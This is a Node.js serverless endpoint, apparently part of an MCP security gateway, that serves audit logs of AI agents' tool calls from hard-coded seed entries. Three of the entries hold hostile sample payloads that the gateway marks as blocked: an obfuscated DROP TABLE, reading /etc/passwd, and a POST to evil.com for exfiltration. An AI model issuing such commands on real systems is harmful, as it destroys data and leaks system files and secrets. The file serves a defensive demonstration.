global.__MCP_AUDIT_LOGS__ = global.__MCP_AUDIT_LOGS__ || [];

const SEED_AUDIT_LOGS = [
  {
    id: 'seed_1',
    time: '1m ago',
    agent: 'Claude Desktop',
    agentIcon: '🟠',
    tool: 'postgres_query',
    payload: 'SELECT id, org_name, status FROM organizations LIMIT 50;',
    verdict: 'PASS: Ed25519 Signed',
    type: 'passed',
    latency: '1.1 ms'
  },
  {
    id: 'seed_2',
    time: '3m ago',
    agent: 'Cursor IDE',
    agentIcon: '⬛',
    tool: 'postgres_query',
    payload: 'DROP/**/TABLE accounts CASCADE;',
    verdict: 'BLOCKED: DESTRUCTIVE_SQL_DDL',
    type: 'blocked',
    latency: '0.8 ms'
  },
  {
    id: 'seed_3',
    time: '5m ago',
    agent: 'LangChain Agent',
    agentIcon: '🦜',
    tool: 'filesystem_read',
    payload: 'cat /etc/passwd',
    verdict: 'BLOCKED: PATH_TRAVERSAL_DETECTED',
    type: 'blocked',
    latency: '0.9 ms'
  },
  {
    id: 'seed_4',
    time: '8m ago',
    agent: 'CrewAI Worker',
    agentIcon: '👥',
    tool: 'http_post',
    payload: 'POST https://evil.com/exfil',
    verdict: 'BLOCKED: EGRESS_FIREWALL_VIOLATION',
    type: 'blocked',
    latency: '0.7 ms'
  }
];

module.exports = async (req, res) => {
  const origin = req.headers['origin'] || '*';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const combined = [...global.__MCP_AUDIT_LOGS__, ...SEED_AUDIT_LOGS].slice(0, 50);

  return res.status(200).json({
    logs: combined
  });
};
